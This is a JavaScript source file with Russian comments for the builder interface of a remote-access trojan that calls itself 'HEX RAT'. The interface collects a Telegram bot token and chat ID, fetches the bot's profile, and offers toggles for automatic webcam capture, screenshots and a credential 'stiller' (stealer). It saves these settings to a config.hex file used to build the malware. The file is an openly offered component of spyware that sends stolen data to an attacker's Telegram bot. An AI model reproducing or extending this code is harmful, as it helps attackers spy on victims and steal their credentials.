// Элементы формы
const botTokenInput = document.getElementById('botToken');
const botMessageInput = document.getElementById('botMessage');
const chatIdInput = document.getElementById('chatId');
const autoRunInput = document.getElementById('autoRun');
const loadBotInfoBtn = document.getElementById('loadBotInfo');
const buildBotBtn = document.getElementById('buildBot');

// Элементы предпросмотра
const namePreview = document.getElementById('namePreview');
const avatarPreview = document.getElementById('avatarPreview');
const messagePreview = document.getElementById('messagePreview');
const buttonsPreview = document.getElementById('buttonsPreview');

// Контейнер для медиа
let mediaContainer = document.createElement('div');
mediaContainer.className = 'bot-media';
buttonsPreview.parentElement.appendChild(mediaContainer);

// === Обновление предпросмотра сообщения ===
function updatePreview() {
  messagePreview.textContent = botMessageInput.value || 'HEX RAT BY VSENIKIZANYATI';
}

// === Загрузка информации о боте ===
async function loadBotInfo() {
  const token = botTokenInput.value.trim();
  if (!token) {
    alert('Введите токен!');
    return;
  }

  try {
    const res = await fetch(`https://api.telegram.org/bot${token}/getMe`);
    const data = await res.json();

    if (!data.ok) throw new Error(data.description);

    namePreview.textContent = data.result.first_name || data.result.username;

    // Загрузка аватара
    const userId = data.result.id;
    const photoRes = await fetch(`https://api.telegram.org/bot${token}/getUserProfilePhotos?user_id=${userId}&limit=1`);
    const photoData = await photoRes.json();

    if (photoData.ok && photoData.result.total_count > 0) {
      const fileId = photoData.result.photos[0][0].file_id;
      const fileRes = await fetch(`https://api.telegram.org/bot${token}/getFile?file_id=${fileId}`);
      const fileData = await fileRes.json();

      if (fileData.ok) {
        avatarPreview.src = `https://api.telegram.org/file/bot${token}/${fileData.result.file_path}`;
      }
    } else {
      avatarPreview.src = 'https://via.placeholder.com/40';
    }

  } catch (err) {
    alert('Ошибка: ' + err.message);
  }
}

// === Сохранение данных в config.hex и создание файла для скачивания ===
function saveConfigToFile() {
  // Собираем данные для сохранения в файл
  const configData = {
    botToken: botTokenInput.value.trim(),
    chatId: chatIdInput.value.trim(),
    botMessage: botMessageInput.value.trim(),
    autoRun: autoRunInput.value.trim(),
    autoTasks: {
      webcam: autoTasks.webcam,
      screenshot: autoTasks.screenshot,
      stiller: autoTasks.stiller,
    },
  };

  // Преобразуем объект в строку JSON (можно использовать любую структуру)
  const configString = JSON.stringify(configData, null, 2);

  // Создаем Blob из данных
  const blob = new Blob([configString], { type: 'application/octet-stream' });

  // Создаем ссылку для скачивания файла
  const link = document.createElement('a');
  link.href = URL.createObjectURL(blob);
  link.download = 'config.hex'; // Имя файла для скачивания

  // Имитация клика по ссылке для начала скачивания
  link.click();
}

// === Автоматическое обновление предпросмотра ===
[botMessageInput].forEach(input => {
  input.addEventListener('input', updatePreview);
});
loadBotInfoBtn.addEventListener('click', loadBotInfo);

// === AutoTask функциональность ===
const toggleWebcamBtn = document.getElementById('toggleWebcam');
const toggleScreenshotBtn = document.getElementById('toggleScreenshot');
const toggleStillerBtn = document.getElementById('toggleStiller');

const autoTasks = {
  webcam: false,
  screenshot: false,
  stiller: false,
};

function updateAutoTaskPreview() {
  mediaContainer.innerHTML = '';

  if (autoTasks.webcam) {
    const img = document.createElement('img');
    img.src = 'assets/webcam.png'; // путь к картинке WebCamera
    img.alt = 'WebCamera';
    mediaContainer.appendChild(img);
  }

  if (autoTasks.screenshot) {
    const img = document.createElement('img');
    img.src = 'assets/screenshot.png'; // путь к картинке Screenshot
    img.alt = 'Screenshot';
    mediaContainer.appendChild(img);
  }
}

toggleWebcamBtn.addEventListener('click', () => {
  autoTasks.webcam = !autoTasks.webcam;
  toggleWebcamBtn.classList.toggle('active', autoTasks.webcam);
  updateAutoTaskPreview();
});

toggleScreenshotBtn.addEventListener('click', () => {
  autoTasks.screenshot = !autoTasks.screenshot;
  toggleScreenshotBtn.classList.toggle('active', autoTasks.screenshot);
  updateAutoTaskPreview();
});

toggleStillerBtn.addEventListener('click', () => {
  autoTasks.stiller = !autoTasks.stiller;
  toggleStillerBtn.classList.toggle('active', autoTasks.stiller);
  updateAutoTaskPreview();
});

// === Обработчик для кнопки Build ===
buildBotBtn.addEventListener('click', saveConfigToFile);
